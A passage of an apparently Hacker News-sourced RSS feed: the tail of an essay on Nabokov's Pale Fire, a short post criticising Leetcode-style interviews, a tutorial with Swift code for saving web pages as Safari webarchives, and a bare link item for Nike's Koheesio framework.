Zembla and Appalachia alike: direct and subtle references to Browning, Shakespeare, Eliot and Goethe shine piercingly or dimly in the most quotidian and/or dramatic scenes, sometimes ostentatiously quoted, sometimes so simply and quietly <em>there</em> that only a scholar would notice.</p> <p>Only a scholar would notice most of these (and I haven’t even noted all of it), at least on the first reading; while I was aware of some of this layered patterning (the repetitive tropes of butterflies, dancing lights, opposing colours and rejected girls for example are hard to miss), I discovered most of what I’ve summarised above through critics, particularly Brian Boyd who’s book I love and recommend. Indeed the novel’s complexity has ironically unleashed armies of Kinbotes, devoting themselves to decades-long online arguments about whether or not the character John Shade invented Kinbote and faked his own death or if the reverse is true, that Kinbote actually invented Shade and wrote the poem attributed to him or — but wait! — that actually the deceased Hazel Shade spiritually transmitted the delusion of Zembla into Kinbote’s tortured mind so that he could tell her father about it and also to comfort Kinbote himself and further to create a more beautiful version of her own lonely life in his fantasy.</p> <p>“Indeed the novel’s complexity has ironically unleashed armies of Kinbotes, devoting themselves to decades-long online arguments…”</p> <p>To refrain McCarthy: “a clockwork toy, a chess problem, an infernal machine, <em>a trap to catch reviewers</em>…” Except that in the context of this fantastic novel, the critic’s theories are not as crazy as they appear on paper. I don’t find McCarthy’s words entirely right; the book is more like its own living universe than anything mechanical, and in such a world (as in ours) many strange things can happen. It is designed yes, but not to trap. It matters because I think this chess game emphasis has contributed to the popular perception of the book as steroidally brainy but emotionally cold. Critics haven’t exactly ignored the book’s touching aspects: the death of Hazel Shade and her parent’s grief are given their due as is the theme of mortality and the moving beauty of the natural world. (Though I agree with Michael Wood, in his essay <em>The Demons of Our Pity, </em>that there is something oddly shallow about the emotion towards Hazel in Shade’s poem, not to mention an unpleasant fixation on her homeliness.) But those emotional elements tend to get lost in the critical excitement about traps and problems and creates the impression that in order to enjoy <em>Pale Fire </em>you need not merely an intelligent mind but a <em>very particular type </em>of intelligent mind, preferably one outfitted with a first-class education.</p> <p>But. When I first read the book I was an ignorant 24-year-old with a barely adequate undergraduate education. Because I had not majored in English (I was concerned about what kind of job I might get after graduating and an English degree did not look promising), I had not taken many literature courses. I had read very little poetry and almost no Shakespeare. I recognised the names of the poets mentioned in <em>Pale Fire </em>but I could not possibly register the more subtle meanings evoked by the adjacent language because I didn’t know their work in any depth or really at all. That didn’t matter. I loved <em>Pale Fire. </em>I could feel its intellectual power in the intense perceptual contrasts of its characters, in the descriptions of faces and objects and, for example, the swift evocation of an alternate world in John Shade’s image of himself reflected in the window glass, “above the grass” with his furniture and an apple on a plate. I could feel it in the patterning I saw and sensed, viscerally, as if I was not only seeing a griffin landing before me but feeling the vibration of its wings come up through the ground into the soles of my feet.</p> <p>“I could feel its intellectual power in the intense perceptual contrasts of its characters.”</p> <p>But it wasn’t primarily the intellectual power that drew me in. I experienced <em>Pale Fire </em>far more emotionally than intellectually. I felt the emotion of longing saturating the story, the depth of Kinbote’s loneliness, the cruelty visited on Hazel and the bewilderment of her father at having lost her; I felt Kinbote’s anguish in his affected, light and giddy voice, and in the way those naturally polarised tones were electrically joined in the fast-moving comedy. (If you have read <em>Lolita, </em>it is a voice reminiscent of Humbert sans Dolores on a drunken drive with drunken Rita on the perpetual road to Grainball: the voice of someone broken and desperate yet mentally agile enough to bob and weave under a rain of blows, real and imagined; someone too broken and desperate to fully dissemble). The actual prose was, as Ron Rosenbaum noted, a great sensual pleasure. Then, about 200 pages in, the experience intensified when I came to this description of a secondary character, Queen Disa, the woman Kinbote/Charles indifferently marries because marry he must:</p></div><div>  <p><em>‘What had the sentiments he entertained in regard to Disa ever amounted to? Friendly indifference and bleak respect. Not even in the first bloom of their marriage had he felt any tenderness or any excitement. Of pity, of heartache, there could be no question. He was, had always been, casual and heartless. But the heart of his dreaming self, both before and after the rupture, made extraordinary amends.”</em></p> <p>This is a narrative depth change, with no lightness or giddiness or humour. I sometimes read this section to students as an example of how a narrative can be indirectly and deeply illuminated through minor characters or descriptive asides, and no matter who they are, grad students or sophomores taking the class to fulfil a Lit major, I can feel their attention come into focus from the first two lines. Even with minimal information about who the speaker or the woman he is speaking of might be, almost any nominal adult, no matter how inexperienced, can recognise the emotional reality of those sentences that open the soliloquy.</p> <p><em>“He dreamed of her more often, and with incomparably more poignancy, than his surface-life feelings for her warranted; these dreams occurred when he least thought of her, and worries in no way connected with her assumed her image in the subliminal world as a battle or a reform becomes a bird of wonder in a tale for children. These heart-rending dreams transformed the drab prose of his feelings for her into strong and strange poetry, subsiding undulations of which would flash and disturb him throughout the day, bringing back the pang and the richness — and then only the pang, and then only its glancing reflection — but not at all affecting his attitude towards the real Disa.”</em></p> <p>Here, words create images to describe something that happens wordlessly, physically but subtly, in the inchoate realm of feeling. The words “subsiding undulations” which “flash” and then gradually fade (as a wave returns and fades) describe the movement of intimate emotion, the way people repeatedly draw near one another and then move away, sometimes simultaneously, in different aspects. The words also describe the bodily experience of strong feeling in a single person, rising up and then subsiding, either becoming greater or — as it is here — fading completely but for a troubling echo that lingers so faintly you can’t tell where it’s coming from. It is something almost impossible to talk about let alone write about but which almost everyone experiences. Using words to describe what is experienced wordlessly is art on a high level, at least as impressive and more affecting than even the most intricate structuring.</p> <p><em>“Her image, as she entered and re-entered his sleep rising apprehensively from a distant sofa or going in search of the messenger who, they said, had just passed through the draperies, took into account changes of fashion; but the Disa wearing the dress he had seen on her the summer of the Glass Works explosion, or last Sunday, or in any other antechamber of time, forever remained exactly as she looked on the day he had first told her he did not love her. That happened during a hopeless trip to Italy, in a lakeside hotel garden — roses, black araucarias, rusty, greenish hydrangeas — one cloudless evening with the mountains of the far shore swimming in a sunset haze and the lake all peach syrup regularly rippled with pale blue, and the captions of a newspaper spread flat on the foul bottom near the stone bank perfectly readable through the shallow diaphanous filth, and because, upon hearing him out, she sank down on the lawn in an impossible posture, examining a grass culm and frowning, he had taken his words back at once; but the shock had fatally starred the mirror, and thenceforth in his dreams her image was infected with the memory of that confession as with some disease or the secret aftereffects of a surgical operation too intimate to be mentioned.”</em></p> <p>The pain of unrequited love, both for the lover and the loved one who cannot return the feeling, is an obvious subject of the book as is the longing for an ideal which bleeds up through mundane reality, “the shallow diaphanous filth” vs. the fantastic colours, the dream which might be delusional or might actually be more real than acted-out life; the imagery is in effect a crumbling bridge between the two. It is in this passage that I see what I called the understated “essential something” about the book: how this elemental and raw experience is evoked as closely as possible to how it is felt, through the textures of the natural world that exist as the body exists, humbly and unknowably: plants, mountains, water, sky, light, the amazement of colours.</p>  <p><em>“The gist, rather than the actual plot of the dream, was a constant refutation of his not loving her. His dream-love for her exceeded in emotional tone, in spiritual passion and depth, anything he had experienced in his surface existence. This love was like an endless wringing of hands, like a blundering of the soul through an infinite maze of hopelessness and remorse. They were, in a sense, amorous dreams, for they were permeated with tenderness, with a longing to sink his head onto her lap and sob away the monstrous past. They brimmed with the awful awareness of her being so young and so helpless. They were purer than his life. What carnal aura there was in them came not from her but from those with whom he betrayed her… and even so the sexual scum remained somewhere far above the sunken treasure and was quite unimportant.”</em></p> <p><em>A blundering of the soul through an infinite maze of hopelessness and remorse. </em>This secondary character may be, as some critics say, a figment of Kinbote’s narcissistic imagination; she may be an alt-world creation of the deceased Hazel Shade. But whatever she is, the complex of emotions embodied in and provoked by her are real in any existing human world, as deep and for me more riveting than any problem posed anywhere else in the book. It is the mystery of human feeling/lack of feeling, the need for love and the fear of it, part of what Kinbote calls “the prison of personality” and it is not going to be solved. But here at least it is seen profoundly, with the compassionate wisdom that is the real “Crown Jewels” of <em>Pale Fire, </em>hidden in a description of an incidental relationship.</p> <p>Of course, there are other jewels hidden elsewhere in the book, more than might be addressed within the scope of this essay. Brian Boyd quotes Nabokov remarking in relation to <em>Pale Fire </em>that: “You can get nearer and nearer, so to speak, to reality; but you can never get near enough because reality is an infinite succession of steps, levels of perception, false bottoms and hence unquenchable, unattainable.” The novel is a joyful and reverent mimic of such reality — and yet it invites readers and critics to come close, to find the unattainable, and so, with great gusto, they try. And I am glad that they do, even if it sometimes looks a bit like blundering through an infinite maze of some sort. I am especially glad for Brian Boyd and Michael Wood; over time, reading and learning from their intrepid analyses has deepened my understanding and respect for the book. But I still remember, as something rare and unrepeatable, the power of my first reading when I had so little knowledge and yet felt the brilliance and depth of <em>Pale Fire </em>almost as if through my skin. If reading this is your first experience of the book, that is what I hope for you: that you acquire a copy and see the griffin come in for a landing. If you worry that it is looking down on you, don’t. Because all you have to do is look up. Its heart is strange but it is huge; let yours beat in response.</p> <p><strong>***</strong></p> <p><em>Pale Fire, with an introduction by Mary Gaitskill, is <a href="https://www.amazon.co.uk/Pale-Fire-W-N-Essentials/dp/1474620876" target="_blank" rel="noopener">published by Weidenfeld &amp; Nicolson</a>.</em></p>   <hr>   </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I Am So Sick of Leetcode-Style Interviews (404 pts)]]></title>
            <link>https://nelson.cloud/i-am-so-sick-of-leetcode-style-interviews/</link>
            <guid>40571395</guid>
            <pubDate>Tue, 04 Jun 2024 06:47:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://nelson.cloud/i-am-so-sick-of-leetcode-style-interviews/">https://nelson.cloud/i-am-so-sick-of-leetcode-style-interviews/</a>, See on <a href="https://news.ycombinator.com/item?id=40571395">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div><p>I quit my previous job at <a href="https://robinhood.com/?ref=nelson.cloud" target="_blank">Robinhood</a>
in late November of 2023 mainly for health reasons. I’ve been in various interviews since then. Things have fallen off for one reason or another but I just gotta say…I am getting so tired of <a href="https://leetcode.com/problemset/?ref=nelson.cloud" target="_blank">Leetcode</a>
-style interviews. Especially since I know for a fact they don’t reflect the actual responsibilities of a software engineering of a job.</p><p>It seems like most (if not all) companies do these kinds of interviews simply because that’s what all the big companies do, like Google, Facebook, Amazon, and so on.</p><p>I’ve had some very bright engineers tell me that I shouldn’t memorize things that I can easily google. But yet, these interviews quiz me on things that I can easily Google that I may not know off the top of my head. It’s absurd.</p><p>I don’t really have a solution to this problem, I just know it’s a problem.</p><p>And I’m sick of it.</p><p>If you need a Software Engineer with AWS, Kuberentes, and Ruby on Rails experience, and you don’t do silly quizzes, feel free to reach out!</p></div></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Creating a Safari webarchive from the command line (103 pts)]]></title>
            <link>https://alexwlchan.net/2024/creating-a-safari-webarchive/</link>
            <guid>40571270</guid>
            <pubDate>Tue, 04 Jun 2024 06:24:39 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://alexwlchan.net/2024/creating-a-safari-webarchive/">https://alexwlchan.net/2024/creating-a-safari-webarchive/</a>, See on <a href="https://news.ycombinator.com/item?id=40571270">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="main" tabindex="-1"> <article>   <p>Recently I’ve been trying to create a local archive of my bookmarked web pages. I already have tools to <a href="https://alexwlchan.net/2024/scheduled-screenshots/">take screenshots</a>, and I love them as a way to take quick snapshots and skim the history of a site, but bitmap images aren’t a great archival representation of a website. What if I also want to save the HTML, CSS, and JavaScript, and keep an interactive copy of the page?</p> <p>There are lots of tools in this space; for my personal stuff I’ve come to like <a href="https://en.wikipedia.org/wiki/Webarchive">Safari webarchives</a>. There are several reasons I find them appealing:</p> <ul> <li> <p><strong>Each saved web page is stored as a single file.</strong> Each file includes the entire content of the page, and a single file per web page is pretty manageable. I can create backups, keep multiple copies, and so on.</p> </li> <li> <p><strong>I can easily add pages to my archive that can’t be crawled from the public web.</strong> Lots of the modern web is locked behind paywalls, login screens, interstitial modals that are difficult for automated crawlers to get past. It’s much easier for me to get through them as a human using Safari as my default browser. Once I have a page open, I can save it as a webarchive with the <code>File &gt; Save As…</code> menu item.</p> </li> <li> <p><strong>The archive can be stored locally and offline.</strong> It will always remain available to me, as long as I keep up with backups and maintenance, and I can archive private web pages that I don’t want to put in somebody else’s archive. (For example, I wouldn’t want to save private tweets in the publicly available Wayback Machine.)</p> </li> <li> <p><strong>I can read the format without Safari.</strong> Although Safari is only maintained by Apple, the Safari webarchive format can be read by non-Apple tools – it’s a <a href="https://alexwlchan.net/til/2024/whats-inside-safari-webarchive/">binary property list</a> that stores the raw bytes of the original files. I’m comfortable that I’ll be able to open these archives for a while, even if Safari unexpectedly goes away.</p> </li> </ul> <p>The one thing that’s missing is a way to create webarchive files programatically. Although I could open each page and save it in Safari individually, I have about 6000&nbsp;bookmarks – I’d like a way to automate this process.</p> <p>I was able to write a short script in Swift that does this for me. In the rest of this article I’ll explain how it works, or you can <a href="https://github.com/alexwlchan/safari-webarchiver/">skip to the GitHub repo</a>.</p> <h2 id="prior-art-newzealandpaulwebarchiver">Prior art: newzealandpaul/webarchiver</h2> <p>I found an existing tool for creating Safari webarchives on the command line, <a href="https://github.com/newzealandpaul/webarchiver">written by newzealandpaul</a>.</p> <p>I did some brief testing and it seems to work okay, but I had a few issues. The error messages aren’t very helpful – some of my bookmarks failed to save with an error like “invalid URL”, even though the URL opens just fine. I went to read the code to work out what was happening, but it’s written in Objective‑C and uses deprecated classes like <a href="https://developer.apple.com/documentation/webkit/webview"><code>WebView</code></a> and <a href="https://developer.apple.com/documentation/webkit/webarchive"><code>WebArchive</code></a>.</p> <p>Given that it’s only about 350&nbsp;lines, I wanted to see if I could rewrite it using Swift and the newest classes. I thought that might be easier than trying to understand a language and classes that I’m not super familiar with.</p> <h2 id="playing-with-wkwebview-and-createwebarchivedata">Playing with <code>WKWebView</code> and <code>createWebArchiveData</code></h2> <p>It didn’t take much googling to learn that <code>WebView</code> has been replaced by <a href="https://developer.apple.com/documentation/webkit/wkwebview"><code>WKWebView</code></a>, and that class has a method <a href="https://developer.apple.com/documentation/webkit/wkwebview/3650491-createwebarchivedata"><code>createWebArchiveData</code></a> which “creates a web archive of the web view’s current contents asynchronously”. Perfect!</p> <p>I watched a <a href="https://developer.apple.com/videos/play/wwdc2020/10188/">WWDC session</a> by Brady Eison, a WebKit engineer, where the <code>createWebArchiveData</code> API was introduced. It gave me some useful context about the purpose of <code>WKWebView</code> – it’s for showing web content inside Mac and iOS apps. If you’ve ever used an in-app browser, there was probably an instance of <code>WKWebView</code> somewhere underneath.</p> <p>The session included some sample code for using this API, which I fashioned into an initial script:</p> <div><pre><code><span>import</span> <span>WebKit</span>

<span>let</span> <span>url</span> <span>=</span> <span>URL</span><span>(</span><span>string</span><span>:</span> <span>"https://example.com/"</span><span>)</span>
<span>let</span> <span>savePath</span> <span>=</span> <span>URL</span><span>(</span><span>fileURLWithPath</span><span>:</span> <span>"example.webarchive"</span><span>)</span>

<span>let</span> <span>webView</span> <span>=</span> <span>WKWebView</span><span>()</span>
<span>let</span> <span>request</span> <span>=</span> <span>URLRequest</span><span>(</span><span>url</span><span>:</span> <span>url</span><span>!</span><span>)</span>

<span>webView</span><span>.</span><span>load</span><span>(</span><span>request</span><span>)</span>

<span>// https://developer.apple.com/videos/play/wwdc2020/10188/?time=1327</span>
<span>webView</span><span>.</span><span>createWebArchiveData</span><span>(</span><span>completionHandler</span><span>:</span> <span>{</span> <span>result</span> <span>in</span>
  <span>do</span> <span>{</span>
    <span>let</span> <span>data</span> <span>=</span> <span>try</span> <span>result</span><span>.</span><span>get</span><span>()</span>
    <span>try</span> <span>data</span><span>.</span><span>write</span><span>(</span><span>to</span><span>:</span> <span>savePath</span><span>)</span>
  <span>}</span> <span>catch</span> <span>{</span>
    <span>print</span><span>(</span><span>"Unable to save webarchive file: </span><span>\(</span><span>error</span><span>.</span><span>localizedDescription</span><span>)</span><span>"</span><span>)</span>
  <span>}</span>
<span>})</span>
</code></pre></div> <p>I saved this code as <code>create_webarchive.swift</code>, and ran it on the command line:</p> <div><pre><code><span>$</span><span> </span>swift create_webarchive.swift
</code></pre></div> <p>I was hoping that this would load <code>https://example.com/</code>, and save a webarchive of the page to <code>example.webarchive</code>. The script did run, but it only created an empty file.</p> <p>I did a little debugging, and I realised that my <code>WKWebView</code> was never actually loading the web page. I pointed it at a local web server, and I could see it wasn’t fetching any data. Hmm.</p> <h2 id="we-need-a-loop-de-loop">We need a loop-de-loop</h2> <p>Using a <code>WKWebView</code> inside a Swift script isn’t how it’s normally used. Most of the time, it appears as part of a web browser inside a Mac or iOS app. In that context, you don’t want fetching web pages to be a blocking operation – you want the rest of the app to remain responsive and usable, and download the web page as a background operation.</p> <p>This made me wonder if my problem was that my script doesn’t have “background operations”. When I ask <code>WKWebView</code> to load my page, it’s getting shoved in a queue of background tasks, but nothing is picking up work from that queue. I don’t fully understand what I did next, but I think I’ve got the gist of the problem.</p> <p>I had another look at newzealandpaul’s code, and I found <a href="https://github.com/newzealandpaul/webarchiver/blob/4d04669a9cb3f8a7e5ab492e7c3a4175b5586ac5/KBWebArchiver.m#L214-L222">some lines</a> that look a bit like they’re solving the same problem. I think the <code>NSRunLoop</code> is doing work that’s on that background queue, and it’s waiting until the page has finished loading:</p> <div><pre><code><span>// Wait until the site has finished loading.</span>
<span>NSRunLoop</span> <span>*</span><span>currentRunLoop</span> <span>=</span> <span>[</span><span>NSRunLoop</span> <span>currentRunLoop</span><span>];</span>
<span>NSTimeInterval</span> <span>resolution</span> <span>=</span> <span>_localResourceLoadingOnly</span> <span>?</span> <span>0</span><span>.</span><span>1</span> <span>:</span> <span>0</span><span>.</span><span>01</span><span>;</span>
<span>BOOL</span> <span>isRunning</span> <span>=</span> <span>YES</span><span>;</span>

<span>while</span> <span>(</span><span>isRunning</span> <span>&amp;&amp;</span> <span>_finishedLoading</span> <span>==</span> <span>NO</span><span>)</span> <span>{</span>
  <span>NSDate</span> <span>*</span><span>next</span> <span>=</span> <span>[</span><span>NSDate</span> <span>dateWithTimeIntervalSinceNow</span><span>:</span><span>resolution</span><span>];</span>
  <span>isRunning</span> <span>=</span> <span>[</span><span>currentRunLoop</span> <span>runMode</span><span>:</span><span>NSDefaultRunLoopMode</span> <span>beforeDate</span><span>:</span><span>next</span><span>];</span>
<span>}</span>
</code></pre></div> <p>I was able to adapt this idea for my Swift script, using <code>RunLoop.main.run()</code>. I can track the progress of <code>WKWebView</code> with the <code>isLoading</code> attribute, so I kept running the main loop for short intervals until I could see this attribute change. I realised that <code>createWebArchiveData</code> is also an asynchronous operation that runs in the background, so I need to wait for that to finish too.</p> <p>I added these two functions to <code>WKWebView</code>. Here’s my updated script:</p> <div><pre><code><span>import</span> <span>WebKit</span>

<span>let</span> <span>urlString</span> <span>=</span> <span>"https://www.example.com"</span>
<span>let</span> <span>savePath</span> <span>=</span> <span>URL</span><span>(</span><span>fileURLWithPath</span><span>:</span> <span>"example.webarchive"</span><span>)</span>

<span>extension</span> <span>WKWebView</span> <span>{</span>

  <span>/// Load the given URL in the web view.</span>
  <span>///</span>
  <span>/// This method will block until the URL has finished loading.</span>
  <span>func</span> <span>load</span><span>(</span><span>_</span> <span>urlString</span><span>:</span> <span>String</span><span>)</span> <span>{</span>
    <span>if</span> <span>let</span> <span>url</span> <span>=</span> <span>URL</span><span>(</span><span>string</span><span>:</span> <span>urlString</span><span>)</span> <span>{</span>
      <span>let</span> <span>request</span> <span>=</span> <span>URLRequest</span><span>(</span><span>url</span><span>:</span> <span>url</span><span>)</span>
      <span>self</span><span>.</span><span>load</span><span>(</span><span>request</span><span>)</span>

      <span>while</span> <span>(</span><span>self</span><span>.</span><span>isLoading</span><span>)</span> <span>{</span>
        <span>RunLoop</span><span>.</span><span>main</span><span>.</span><span>run</span><span>(</span><span>until</span><span>:</span> <span>Date</span><span>(</span><span>timeIntervalSinceNow</span><span>:</span> <span>0.1</span><span>))</span>
      <span>}</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>fputs</span><span>(</span><span>"Unable to use </span><span>\(</span><span>urlString</span><span>)</span><span> as a URL</span><span>\n</span><span>"</span><span>,</span> <span>stderr</span><span>)</span>
      <span>exit</span><span>(</span><span>1</span><span>)</span>
    <span>}</span>
  <span>}</span>

  <span>/// Save a copy of the web view's contents as a webarchive file.</span>
  <span>///</span>
  <span>/// This method will block until the webarchive has been saved,</span>
  <span>/// or the save has failed for some reason.</span>
  <span>func</span> <span>saveAsWebArchive</span><span>(</span><span>savePath</span><span>:</span> <span>URL</span><span>)</span> <span>{</span>
    <span>var</span> <span>isSaving</span> <span>=</span> <span>true</span>

    <span>self</span><span>.</span><span>createWebArchiveData</span><span>(</span><span>completionHandler</span><span>:</span> <span>{</span> <span>result</span> <span>in</span>
      <span>do</span> <span>{</span>
        <span>let</span> <span>data</span> <span>=</span> <span>try</span> <span>result</span><span>.</span><span>get</span><span>()</span>
        <span>try</span> <span>data</span><span>.</span><span>write</span><span>(</span><span>to</span><span>:</span> <span>savePath</span><span>)</span>
        <span>isSaving</span> <span>=</span> <span>false</span>
      <span>}</span> <span>catch</span> <span>{</span>
        <span>fputs</span><span>(</span><span>"Unable to save webarchive file: </span><span>\(</span><span>error</span><span>.</span><span>localizedDescription</span><span>)\n</span><span>"</span><span>,</span> <span>stderr</span><span>)</span>
        <span>exit</span><span>(</span><span>1</span><span>)</span>
      <span>}</span>
    <span>})</span>

    <span>while</span> <span>(</span><span>isSaving</span><span>)</span> <span>{</span>
      <span>RunLoop</span><span>.</span><span>main</span><span>.</span><span>run</span><span>(</span><span>until</span><span>:</span> <span>Date</span><span>(</span><span>timeIntervalSinceNow</span><span>:</span> <span>0.1</span><span>))</span>
    <span>}</span>
  <span>}</span>
<span>}</span>

<span>let</span> <span>webView</span> <span>=</span> <span>WKWebView</span><span>()</span>

<span>webView</span><span>.</span><span>load</span><span>(</span><span>urlString</span><span>)</span>
<span>webView</span><span>.</span><span>saveAsWebArchive</span><span>(</span><span>savePath</span><span>:</span> <span>savePath</span><span>)</span>
</code></pre></div> <p>This works, but there’s a fairly glaring hole – it will archive whatever got loaded into the web view, even if the page wasn’t loaded successfully. Let’s fix that next.</p> <h2 id="checking-the-page-loaded-successfully-with-wknavigationdelegate">Checking the page loaded successfully with <code>WKNavigationDelegate</code></h2> <p>If there’s some error getting the page – say, my Internet connection is down or the remote server doesn’t respond – the <code>WKWebView</code> will still complete loading and set <code>isLoading = false</code>. My code will then proceed to archive the error page, which is unhelpful. I’d rather the script threw an error, and prompted me to investigate.</p> <p>While I was reading more about <code>WKWebView</code>, I came across the <a href="https://developer.apple.com/documentation/webkit/wknavigationdelegate"><code>WKNavigationDelegate</code></a> protocol. If you implement this protocol, you can track the progress of a page load, and get detailed events like “the page has started to load” and “the page failed to load with an error”.</p> <p>There are <a href="https://developer.apple.com/documentation/webkit/wknavigationdelegate#2172386">two methods</a> you can implement, which will be called if an error at different times during page load. Because I’m working in a standalone script, I just have them print an error and then terminate the process – I don’t need more sophisticated error handling than that.</p> <p>I also wrote a method that checks the HTTP status code of the response, and terminates the script if it’s not an HTTP&nbsp;200 OK. This means that 404 pages and server errors won’t be automatically archived – I can do that manually in Safari if I think they’re really important.</p> <p>Here’s the delegate I wrote:</p> <div><pre><code><span>/// Print an error message and terminate the process if there are</span>
<span>/// any errors while loading a page.</span>
<span>class</span> <span>ExitOnFailureDelegate</span><span>:</span> <span>NSObject</span><span>,</span> <span>WKNavigationDelegate</span> <span>{</span>
  <span>var</span> <span>urlString</span><span>:</span> <span>String</span>

  <span>init</span><span>(</span><span>_</span> <span>urlString</span><span>:</span> <span>String</span><span>)</span> <span>{</span>
    <span>self</span><span>.</span><span>urlString</span> <span>=</span> <span>urlString</span>
  <span>}</span>

  <span>func</span> <span>webView</span><span>(</span>
    <span>_</span><span>:</span> <span>WKWebView</span><span>,</span>
    <span>didFail</span><span>:</span> <span>WKNavigation</span><span>!</span><span>,</span>
    <span>withError</span> <span>error</span><span>:</span> <span>Error</span>
  <span>)</span> <span>{</span>
    <span>fputs</span><span>(</span><span>"Failed to load </span><span>\(</span><span>self</span><span>.</span><span>urlString</span><span>)</span><span>: </span><span>\(</span><span>error</span><span>.</span><span>localizedDescription</span><span>)\n</span><span>"</span><span>,</span> <span>stderr</span><span>)</span>
    <span>exit</span><span>(</span><span>1</span><span>)</span>
  <span>}</span>

  <span>func</span> <span>webView</span><span>(</span>
    <span>_</span><span>:</span> <span>WKWebView</span><span>,</span>
    <span>didFailProvisionalNavigation</span><span>:</span> <span>WKNavigation</span><span>!</span><span>,</span>
    <span>withError</span> <span>error</span><span>:</span> <span>Error</span>
  <span>)</span> <span>{</span>
    <span>fputs</span><span>(</span><span>"Failed to load </span><span>\(</span><span>self</span><span>.</span><span>urlString</span><span>)</span><span>: </span><span>\(</span><span>error</span><span>.</span><span>localizedDescription</span><span>)\n</span><span>"</span><span>,</span> <span>stderr</span><span>)</span>
    <span>exit</span><span>(</span><span>1</span><span>)</span>
  <span>}</span>

  <span>func</span> <span>webView</span><span>(</span>
    <span>_</span><span>:</span> <span>WKWebView</span><span>,</span>
    <span>decidePolicyFor</span> <span>navigationResponse</span><span>:</span> <span>WKNavigationResponse</span><span>,</span>
    <span>decisionHandler</span><span>:</span> <span>(</span><span>WKNavigationResponsePolicy</span><span>)</span> <span>-&gt;</span> <span>Void</span>
  <span>)</span> <span>{</span>
    <span>if</span> <span>let</span> <span>httpUrlResponse</span> <span>=</span> <span>(</span><span>navigationResponse</span><span>.</span><span>response</span> <span>as?</span> <span>HTTPURLResponse</span><span>)</span> <span>{</span>
      <span>if</span> <span>httpUrlResponse</span><span>.</span><span>statusCode</span> <span>!=</span> <span>200</span> <span>{</span>
        <span>fputs</span><span>(</span><span>"Failed to load </span><span>\(</span><span>self</span><span>.</span><span>urlString</span><span>)</span><span>: got status code </span><span>\(</span><span>httpUrlResponse</span><span>.</span><span>statusCode</span><span>)\n</span><span>"</span><span>,</span> <span>stderr</span><span>)</span>
        <span>exit</span><span>(</span><span>1</span><span>)</span>
      <span>}</span>
    <span>}</span>

    <span>decisionHandler</span><span>(</span><span>.</span><span>allow</span><span>)</span>
  <span>}</span>
<span>}</span>

<span>let</span> <span>webView</span> <span>=</span> <span>WKWebView</span><span>()</span>

<span>let</span> <span>delegate</span> <span>=</span> <span>ExitOnFailureDelegate</span><span>()</span>
<span>webView</span><span>.</span><span>navigationDelegate</span> <span>=</span> <span>delegate</span>
</code></pre></div> <p>To check this error handling worked correctly, I tried loading a website while I was offline, loading a URL with a domain name that doesn’t have DNS, and loading a page that 404s on my own website. All three failed as I want:</p> <div><pre><code><span>$</span><span> </span>swift create_webarchive.swift
<span>Failed to load web page: The Internet connection appears to be offline.

</span><span>$</span><span> </span>swift create_webarchive.swift
<span>Failed to load web page: A server with the specified hostname could not be found.

</span><span>$</span><span> </span>swift create_webarchive.swift
<span>Failed to load web page: got status code 404
</span></code></pre></div> <h2 id="adding-some-command-line-arguments">Adding some command-line arguments</h2> <p>Right now the URL string and save location are both hard-coded; I wanted to make them command-line arguments. I can do this by inspecting <code>CommandLine.arguments</code>:</p> <div><pre><code><span>guard</span> <span>CommandLine</span><span>.</span><span>arguments</span><span>.</span><span>count</span> <span>==</span> <span>3</span> <span>else</span> <span>{</span>
  <span>print</span><span>(</span><span>"Usage: </span><span>\(</span><span>CommandLine</span><span>.</span><span>arguments</span><span>[</span><span>0</span><span>]</span><span>)</span><span> &lt;URL&gt; &lt;OUTPUT_PATH&gt;"</span><span>)</span>
  <span>exit</span><span>(</span><span>1</span><span>)</span>
<span>}</span>

<span>let</span> <span>urlString</span> <span>=</span> <span>CommandLine</span><span>.</span><span>arguments</span><span>[</span><span>1</span><span>]</span>
<span>let</span> <span>savePath</span> <span>=</span> <span>URL</span><span>(</span><span>fileURLWithPath</span><span>:</span> <span>CommandLine</span><span>.</span><span>arguments</span><span>[</span><span>2</span><span>])</span>
</code></pre></div> <p>And then I can call the script with my two arguments:</p> <div><pre><code><span>$</span><span> </span>swift create_webarchive.swift <span>"https://www.example.com/"</span> <span>"example.webarchive"</span>
</code></pre></div> <p>For more complex command-line interfaces, Apple has an open-source <a href="https://www.swift.org/blog/argument-parser/"><code>ArgumentParser</code> library</a>, but I’m not sure how I’d use that in a standalone script.</p> <h2 id="running-it-over-my-bookmarks">Running it over my bookmarks</h2> <p>Once I’d written the initial version of this script and put all the pieces together, I used it to create webarchives for 6000 or so bookmarks in my Pinboard account. It worked pretty well, and captured 85% of my bookmarks – the remaining 15% are broken due to <a href="https://en.wikipedia.org/wiki/Link_rot">link rot</a>. I did a spot check of a few dozen archives that did get saved, and they all look good.</p> <p>My script worked correctly in the happy path, but I went back and improved some of the error messages. I saw a lot of different failures when archiving such a wide variety of URLs, including esoteric HTTP status codes, expired TLS certificates, and a couple of redirect loops. Now those errors are reported in a bit more detail and not just “something went wrong”.</p> <p>I also tweaked the code so it won’t replace an existing webarchive file. I do this by <a href="https://alexwlchan.net/til/2024/how-to-do-exclusive-file-write-in-swift/">adding <code>.withoutOverwriting</code> to my <code>write()</code> call</a>. I don’t want to risk overwriting a known-good archive of a page with a copy that’s now broken.</p> <h2 id="the-finished-script">The finished script</h2> <p>I’ve put the script in a new GitHub repository: <a href="https://github.com/alexwlchan/safari-webarchiver">alexwlchan/safari-webarchiver</a>. This repo will be the canonical home for this code, and I’ll post any updates there.</p> <p>It includes the final copy of the code in this post, a small collection of tests, and some instructions on how to download and use the finished script.</p> </article> </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Koheesio: Nike's Python-based framework to build advanced data-pipelines (189 pts)]]></title>
            <link>https://github.com/Nike-Inc/koheesio</link>
            <guid>40570892</guid>
            <pubDate>Tue, 04 Jun 2024 05:07:57 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/Nike-Inc/koheesio">https://github.com/Nike-Inc/koheesio</a>, See on <a href="https://news.ycombinator.com/item?id=40570892">Hacker News</a></p>
